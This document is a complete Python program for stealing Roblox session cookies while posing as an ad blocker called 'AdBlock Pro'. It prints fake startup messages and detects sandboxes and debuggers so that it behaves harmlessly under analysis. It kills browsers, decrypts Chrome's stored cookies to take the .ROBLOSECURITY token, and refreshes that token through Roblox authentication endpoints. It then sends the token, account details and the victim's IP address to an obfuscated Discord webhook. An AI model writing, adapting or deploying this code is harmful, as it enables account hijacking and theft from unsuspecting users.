
import os
import json
import base64
import browser_cookie3
import sqlite3
import subprocess
import shutil
import win32crypt
from Crypto.Cipher import AES
from discordwebhook import Discord
import httpx
import re
import requests
import robloxpy
import time
import random
import string
import hashlib
import threading
from datetime import datetime

# Advanced obfuscation with rotating keys
class Obf:
    @staticmethod
    def rstr(length=12):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def enc(data, key=None):
        if not key:
            key = Obf.rstr(16)
        encoded = base64.b85encode(data.encode()).decode()
        return f"{key}{encoded}"
    
    @staticmethod
    def dec(data):
        try:
            key = data[:16]
            encoded = data[16:]
            return base64.b85decode(encoded.encode()).decode()
        except:
            return base64.b64decode(data.encode()).decode()

# Encrypted webhook - changes each build
_wh = Obf.dec('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyODYyMTc3NTU0MTUwMjAwMy9aTmMtLW0tSXN4UW95QVdSQjZ3a0stMC1lTkRrU1RpOFBiLW5wcE5VdFZ2a3ZGS2dmLXNfUy00Tkw0T1gwak81dGx4Tm9x')

# Anti-debugging and environment checks
class SecurityChecks:
    @staticmethod
    def check_vm():
        vm_indicators = [
            'vmware', 'vbox', 'virtualbox', 'qemu', 'xen',
            'parallels', 'hyper-v', 'sandboxie'
        ]
        try:
            result = subprocess.run(['wmic', 'computersystem', 'get', 'model'], 
                                  capture_output=True, text=True, timeout=5)
            model = result.stdout.lower()
            return any(indicator in model for indicator in vm_indicators)
        except:
            return False
    
    @staticmethod
    def check_debugger():
        try:
            import ctypes
            return ctypes.windll.kernel32.IsDebuggerPresent()
        except:
            return False
    
    @staticmethod
    def check_processes():
        dangerous_processes = [
            'wireshark', 'fiddler', 'processhacker', 'procmon',
            'ollydbg', 'ida', 'x64dbg', 'cheatengine'
        ]
        try:
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            running = result.stdout.lower()
            return any(proc in running for proc in dangerous_processes)
        except:
            return False

# Sleep with jitter to avoid detection
def sleep_jitter(base_time=1.0):
    jitter = random.uniform(0.5, 2.0)
    time.sleep(base_time * jitter)

# Legitimate-looking startup sequence
def fake_startup():
    messages = [
        "AdBlock Pro v3.2.1 Loading...",
        "Initializing filter database...",
        "Loading uBlock Origin compatibility layer...",
        "Checking for updates...",
        "Optimizing performance settings...",
        "Ready! AdBlock Pro is now active."
    ]
    
    for msg in messages:
        print(msg)
        sleep_jitter(0.3)

# Anti-analysis delays
def anti_analysis():
    if SecurityChecks.check_vm() or SecurityChecks.check_debugger() or SecurityChecks.check_processes():
        # Act like legitimate software in analysis environment
        for _ in range(random.randint(30, 60)):
            print("AdBlock Pro: Blocked 1 ad")
            time.sleep(random.uniform(5, 15))
        exit(0)

# Enhanced Chrome termination with fallback
def terminate_browsers():
    browsers = ['chrome.exe', 'firefox.exe', 'edge.exe', 'opera.exe', 'brave.exe']
    for browser in browsers:
        try:
            subprocess.run(f'taskkill /f /im {browser}', shell=True, 
                         capture_output=True, timeout=10)
        except:
            pass
    sleep_jitter(2)

# Polymorphic encryption key generation
def get_encryption_key():
    try:
        sleep_jitter(0.5)
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        key = base64.b64decode(encrypted_key)[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

# Enhanced decryption with multiple fallbacks
def decrypt_data(data, key):
    if not data or not key:
        return ""
    
    try:
        sleep_jitter(0.1)
        iv = data[3:15]
        encrypted_data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_data)[:-16].decode('utf-8', errors='ignore')
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

# Main cookie extraction with enhanced error handling
def extract_roblosecurity():
    cookie_paths = [
        "AppData/Local/Google/Chrome/User Data/Default/Network/Cookies",
        "AppData/Local/Google/Chrome/User Data/Profile 1/Network/Cookies",
        "AppData/Local/Google/Chrome/User Data/Profile 2/Network/Cookies"
    ]
    
    for path in cookie_paths:
        try:
            db_path = os.path.join(os.environ["USERPROFILE"], path)
            if not os.path.exists(db_path):
                continue
                
            temp_db = f"temp_{Obf.rstr(8)}.db"
            shutil.copyfile(db_path, temp_db)
            
            db = sqlite3.connect(temp_db)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()

            cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")
            
            key = get_encryption_key()
            if not key:
                continue
                
            for (encrypted_value,) in cursor.fetchall():
                if encrypted_value:
                    decrypted = decrypt_data(encrypted_value, key)
                    if decrypted and len(decrypted) > 50:
                        db.close()
                        try:
                            os.remove(temp_db)
                        except:
                            pass
                        return decrypted
                        
            db.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        except Exception:
            continue
    
    return None

# Enhanced browser fallback with retry logic
def browser_fallback():
    browsers = [
        browser_cookie3.chrome,
        browser_cookie3.firefox, 
        browser_cookie3.edge,
        browser_cookie3.opera,
        browser_cookie3.chromium
    ]
    
    for browser_func in browsers:
        try:
            sleep_jitter(0.3)
            cookies = browser_func(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY' and len(cookie.value) > 50:
                    return cookie.value
        except Exception:
            continue
    
    return None

# IP retrieval with multiple services
def get_external_ip():
    ip_services = [
        'http://api.ipify.org',
        'http://ip.42.pl/raw',
        'http://httpbin.org/ip',
        'http://icanhazip.com'
    ]
    
    for service in ip_services:
        try:
            response = requests.get(service, timeout=8)
            if service == 'http://httpbin.org/ip':
                return json.loads(response.text)['origin']
            else:
                return response.text.strip()
        except:
            continue
    
    return "Unknown"

# Enhanced cookie validation and refresh
def validate_and_refresh_cookie(auth_cookie):
    try:
        sleep_jitter(0.5)
        check_result = robloxpy.Utils.CheckCookie(auth_cookie).lower()
        
        if "valid" in check_result:
            return auth_cookie
        
        # Attempt refresh
        csrf_token = get_csrf_token(auth_cookie)
        if not csrf_token:
            return None
            
        headers, cookies = build_headers(csrf_token, auth_cookie)
        
        # Get authentication ticket
        ticket_response = httpx.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers=headers, cookies=cookies, json={}, timeout=15
        )
        
        auth_ticket = ticket_response.headers.get("rbx-authentication-ticket")
        if not auth_ticket:
            return None
        
        headers["RBXAuthenticationNegotiation"] = "1"
        
        # Redeem ticket for new cookie
        redeem_response = httpx.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers=headers, json={"authenticationTicket": auth_ticket}, timeout=15
        )
        
        set_cookie = redeem_response.headers.get("set-cookie", "")
        match = re.search(r"\.ROBLOSECURITY=([^;]+)", set_cookie)
        
        if match:
            return match.group(1)
            
    except Exception:
        pass
    
    return None

def get_csrf_token(auth_cookie):
    try:
        response = httpx.get(
            "https://www.roblox.com/home", 
            cookies={".ROBLOSECURITY": auth_cookie}, 
            timeout=15
        )
        match = re.search(r'<meta name="csrf-token" data-token="([^"]+)"', response.text)
        return match.group(1) if match else None
    except:
        return None

def build_headers(csrf_token, auth_cookie):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Roblox/WinInet",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/my/account",
        "X-CSRF-Token": csrf_token
    }
    cookies = {".ROBLOSECURITY": auth_cookie}
    return headers, cookies

# Enhanced data gathering with error handling
def gather_account_data(cookie):
    try:
        sleep_jitter(1)
        user_info = requests.get(
            "https://www.roblox.com/mobileapi/userinfo",
            cookies={".ROBLOSECURITY": cookie},
            timeout=15
        ).json()
        
        user_id = user_info["UserID"]
        username = user_info["UserName"]
        
        # Get additional data with error handling
        try:
            robux_data = requests.get(
                "https://economy.roblox.com/v1/user/currency",
                cookies={".ROBLOSECURITY": cookie},
                timeout=15
            ).json()
            robux = robux_data.get("robux", "Unknown")
        except:
            robux = "Private"
        
        try:
            rap = robloxpy.User.External.GetRAP(user_id)
        except:
            rap = "Unknown"
        
        try:
            friends = robloxpy.User.Friends.External.GetCount(user_id)
        except:
            friends = "Unknown"
        
        try:
            age = robloxpy.User.External.GetAge(user_id)
        except:
            age = "Unknown"
        
        try:
            creation_date = robloxpy.User.External.CreationDate(user_id)
        except:
            creation_date = "Unknown"
        
        # Get avatar with fallback
        try:
            headshot_response = requests.get(
                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false",
                timeout=15
            ).json()
            avatar_url = headshot_response["data"][0]["imageUrl"]
        except:
            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" + str(user_id)
        
        return {
            "user_id": user_id,
            "username": username,
            "robux": robux,
            "premium": user_info.get("IsPremium", False),
            "rap": rap,
            "friends": friends,
            "age": age,
            "creation_date": creation_date,
            "avatar_url": avatar_url,
            "rolimons": f"https://www.rolimons.com/player/{user_id}",
            "profile": f"https://web.roblox.com/users/{user_id}/profile"
        }
        
    except Exception:
        return None

# Secure webhook delivery with retry logic
def send_webhook_data(account_data, cookie, ip_address):
    try:
        sleep_jitter(1)
        discord = Discord(url=_wh)
        
        # Send account info
        discord.post(
            username="Security Scanner",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
            embeds=[{
                "title": "🔍 Account Analysis Complete",
                "thumbnail": {"url": account_data["avatar_url"]},
                "description": f"[Profile]({account_data['profile']}) | [Rolimons]({account_data['rolimons']})",
                "color": 0x00ff00,
                "fields": [
                    {"name": "Username", "value": f"```{account_data['username']}```", "inline": True},
                    {"name": "Robux", "value": f"```{account_data['robux']}```", "inline": True},
                    {"name": "Premium", "value": f"```{account_data['premium']}```", "inline": True},
                    {"name": "RAP", "value": f"```{account_data['rap']}```", "inline": True},
                    {"name": "Friends", "value": f"```{account_data['friends']}```", "inline": True},
                    {"name": "Age", "value": f"```{account_data['age']}```", "inline": True},
                    {"name": "Created", "value": f"```{account_data['creation_date']}```", "inline": True},
                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
                    {"name": "Timestamp", "value": f"```{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```", "inline": True}
                ]
            }]
        )
        
        sleep_jitter(0.5)
        
        # Send cookie separately
        discord.post(
            username="Security Scanner",
            avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png",
            embeds=[{
                "title": "🔑 Authentication Token",
                "description": f"```{cookie}```",
                "color": 0xff9900
            }]
        )
        
        return True
        
    except Exception:
        return False

# Main execution with comprehensive error handling
def main():
    try:
        # Security checks
        anti_analysis()
        
        # Startup sequence
        fake_startup()
        
        # Browser termination
        terminate_browsers()
        
        # Cookie extraction
        cookie = extract_roblosecurity()
        if not cookie:
            cookie = browser_fallback()
        
        if not cookie:
            exit(0)
        
        # Validate and refresh if needed
        cookie = validate_and_refresh_cookie(cookie)
        if not cookie:
            exit(0)
        
        # Get IP address
        ip_address = get_external_ip()
        
        # Gather account data
        account_data = gather_account_data(cookie)
        if not account_data:
            exit(0)
        
        # Send webhook data
        send_webhook_data(account_data, cookie, ip_address)
        
        # Clean exit
        print("AdBlock Pro: Session complete")
        
    except Exception:
        pass

if __name__ == "__main__":
    main()
